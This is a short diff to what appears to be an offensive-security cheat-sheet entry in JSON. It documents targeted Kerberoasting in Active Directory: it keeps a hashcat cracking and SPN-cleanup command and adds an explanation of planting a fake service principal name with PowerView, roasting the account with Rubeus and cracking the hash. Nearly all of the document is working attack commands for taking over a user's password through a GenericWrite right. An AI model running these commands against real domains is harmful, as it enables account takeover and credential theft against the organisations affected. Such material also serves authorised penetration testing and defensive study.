@@ -112,5 +112,6 @@
       "label": "Crack + then remove the SPN",
       "command": "hashcat -m 13100 hash.txt rockyou.txt ; Set-DomainObject -Identity <target> -Clear serviceprincipalname"
     }
-  ]
+  ],
+  "explain": "Turns GenericWrite over a user into that user's password by planting a temporary SPN:\n  Set-DomainObject         PowerView attribute writer\n  -Credential $Cred        act as the account holding the write right\n  -Identity <target>       the SPN-less victim user\n  -SET @{serviceprincipalname='nonexistent/BLAH'}   add a fake SPN so the account becomes Kerberoastable\n  -Verbose                  show the result\nRoast it (Rubeus kerberoast /user:<target>), crack the hash (hashcat -m 13100), then -Clear serviceprincipalname to clean up."
 }
